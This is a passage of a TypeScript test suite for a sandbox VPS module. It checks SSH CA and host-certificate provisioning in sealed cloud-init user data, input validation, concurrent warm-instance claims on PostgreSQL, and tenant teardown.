    expect(userData).toContain('Content-Type: text/cloud-config');
    expect(userData).toContain(JSON.stringify(`${caPublicKey}\n`));
    expect(userData).toContain(JSON.stringify(`sandbox@${sandbox.instanceId}\n`));
    expect(userData).toContain('AuthorizedPrincipalsFile /etc/ssh/bc_sandbox_principals/%u');
    expect(userData).toContain('Content-Type: text/x-shellscript; charset="utf-8"');
    expect(userData).toContain('echo hello');
    expect(userData.trimEnd().endsWith(`--bc-sandbox-${sandbox.instanceId}--`)).toBe(true);
  });

  it('gives each guest a host key certified by the sandbox CA, sealed with its user data', async () => {
    const ca = createSshCertificateAuthority();
    const certifying = vps({
      runtimes: ['cloud-hypervisor'],
      images,
      sandboxExec: {
        caPublicKey,
        certifyHostKey: ({ instanceId, principals, publicKey, validBefore }) =>
          ca.issueHostCertificate({
            publicKey,
            principals,
            keyId: `host/${instanceId}`,
            validBefore,
          }).certificate,
      },
    });
    const certifyingApi = certifying.api!(moduleContext(db)) as VpsApi;
    const template = await createTemplate();
    const create = (key: string) =>
      run(
        (certifyingApi.sandboxes as Record<string, Definition>).create!,
        { tenantId: 'acme', templateId: template.id, idempotencyKey: key },
        alice,
      ) as Promise<SandboxView>;
    // The private key travels only in sealed user data.
    await expect(create('no-broker')).rejects.toMatchObject({ code: 'INVALID_CONFIG' });

    const sealed: string[] = [];
    broker = {
      resolve: async (ref) => `value:${ref}`,
      put: async (tenantId, value) => {
        sealed.push(value);
        return `secret://${tenantId}/sealed-${sealed.length}`;
      },
      delete: async () => {},
    };
    try {
      const sandbox = await create('with-broker');
      const { rows } = await db.query<{ host_certified: boolean; user_data: string }>(
        `SELECT host_certified, user_data FROM instances WHERE id = $1`,
        [sandbox.instanceId],
      );
      expect(rows[0]).toEqual({ host_certified: true, user_data: 'secret://acme/sealed-1' });
      const content = sealed[0]!;
      expect(content).toContain('HostKey /etc/ssh/bc_sandbox_host_key');
      expect(content).toContain('HostCertificate /etc/ssh/bc_sandbox_host_key-cert.pub');
      expect(content).toContain('BEGIN EC PRIVATE KEY');
      const line = /ecdsa-sha2-nistp256-cert-v01@openssh\.com [A-Za-z0-9+/=]+/.exec(content)![0];
      const certificate = parseSshCertificate(line);
      expect(certificate.principals).toEqual([sandbox.instanceId]);
      expect(certificate.certType).toBe('host');

      // The certificate falls a minute short of 30 days: a 30-day sandbox ends with it.
      const month = 30 * 24 * 3600;
      const long = await createTemplate({
        name: 'month',
        defaultTtlSeconds: month,
        maxTtlSeconds: month,
      });
      const monthLong = (await run(
        (certifyingApi.sandboxes as Record<string, Definition>).create!,
        { tenantId: 'acme', templateId: long.id, idempotencyKey: 'month' },
        alice,
      )) as SandboxView;
      const valid = await db.query<{ ms: number }>(
        `SELECT (extract(epoch FROM host_cert_valid_before) * 1000)::float8 AS ms FROM instances WHERE id = $1`,
        [monthLong.instanceId],
      );
      expect(monthLong.expiresAt).toBe(Number(valid.rows[0]!.ms));
      expect(monthLong.expiresAt).toBe(clock.now() + month * 1000 - 60_000);
    } finally {
      broker = undefined;
    }
  });

  it('refuses a secret:// user data it would have to render without a broker', async () => {
    await expect(
      run(
        (execApi.sandboxTemplates as Record<string, Definition>).create!,
        templateInput({
          name: 'secret-ud',
          userData: 'secret://acme/cloud-init',
        }),
        alice,
      ),
    ).rejects.toMatchObject({ code: 'INVALID_CONFIG' });
  });

  it('takes a CA key whose comment has spaces (as pki writes them)', () => {
    expect(() =>
      vps({ images, sandboxExec: { caPublicKey: `${caPublicKey} extra words here` } }),
    ).not.toThrow();
  });

  it('refuses a CA that is not one key line, and a bad account', () => {
    expect(() =>
      vps({ images, sandboxExec: { caPublicKey: `${caPublicKey}\nssh-ed25519 AAAA other` } }),
    ).toThrow(/one OpenSSH/);
    expect(() => vps({ images, sandboxExec: { caPublicKey, account: 'Root!' } })).toThrow(
      /Unix account/,
    );
  });
});

const postgresUrl = process.env.BETTER_COMPUTE_POSTGRES_URL;

/** The same database with search_path pinned to `schema` (then public, where btree_gist lives). */
function inSchema(connection: string, schema: string): string {
  const parsed = new URL(connection);
  parsed.searchParams.set('options', `-c search_path=${schema},public`);
  return parsed.toString();
}

// PGlite has one connection, so claims there never overlap; on PostgreSQL they do, and FOR UPDATE
// SKIP LOCKED must hand concurrent creates different warm instances without waiting on each other.
describe.skipIf(!postgresUrl)('warm claims under real concurrency (PostgreSQL)', () => {
  let admin: SqlExecutor;
  let local: SqlExecutor;
  let schema: string;
  beforeAll(async () => {
    local = db;
    admin = postgres({ url: postgresUrl! });
    await admin.query('CREATE EXTENSION IF NOT EXISTS btree_gist');
    schema = `bc_sandboxes_${globalThis.crypto.randomUUID().replaceAll('-', '').slice(0, 16)}`;
    await admin.query(`CREATE SCHEMA ${schema}`);
    db = postgres({ url: inSchema(postgresUrl!, schema), max: 20 });
    await db.migrate([...capacityMigrations, ...vpsMigrations]);
  });
  afterAll(async () => {
    await db?.close();
    db = local;
    await admin?.query(`DROP SCHEMA IF EXISTS ${schema} CASCADE`);
    await admin?.close();
  });

  it('gives concurrent creates different warm instances, and the rest cold ones', async () => {
    const template = await createTemplate({ warm: { min: 2 } });
    await reconcileSandboxes();
    await hostsReport('paused');
    const who = (index: number): Caller => ({ ...alice, identityId: `usr_${index}` });
    const created = await Promise.all(
      [0, 1, 2].map((index) =>
        createSandbox(template.id, { idempotencyKey: `race-${index}` }, who(index)),
      ),
    );
    const warm = created.filter((sandbox) => sandbox.warm);
    expect(warm).toHaveLength(2);
    expect(new Set(warm.map((sandbox) => sandbox.instanceId)).size).toBe(2);
    expect(new Set(created.map((sandbox) => sandbox.instanceId)).size).toBe(3);
  });
});

describe('tenant teardown', () => {
  it('deletes every instance of the tenant, sandboxes and warm ones included, until none is left', async () => {
    const template = await createTemplate({ warm: { min: 1 } });
    await reconcileSandboxes();
    const sandbox = await createSandbox(template.id);
    const context = moduleContext(db);
    expect(await module.tenantDeleted!(context, 'acme')).toBe('SYNC_AGAIN');
    const desired = await db.query<{ desired_state: string }>(
      `SELECT DISTINCT desired_state FROM instances WHERE tenant_id = 'acme'`,
    );
    expect(desired.rows).toEqual([{ desired_state: 'deleted' }]);
    for (const { id } of (await db.query<{ id: string }>(`SELECT id FROM instances`)).rows)
      await reconcileInstance(id);
    await hostsReport('absent');
    expect(await module.tenantDeleted!(context, 'acme')).toBe('DONE');
    expect(await used()).toMatchObject({ vcpu: 0 });
    await reconcileSandboxes();
    expect(await getSandbox(sandbox.id)).toMatchObject({ state: 'deleted' });
    // No refill for a deleted tenant's template.
    expect((await db.query(`SELECT 1 FROM instances WHERE state <> 'deleted'`)).rows).toHaveLength(
      0,
    );
  });
});
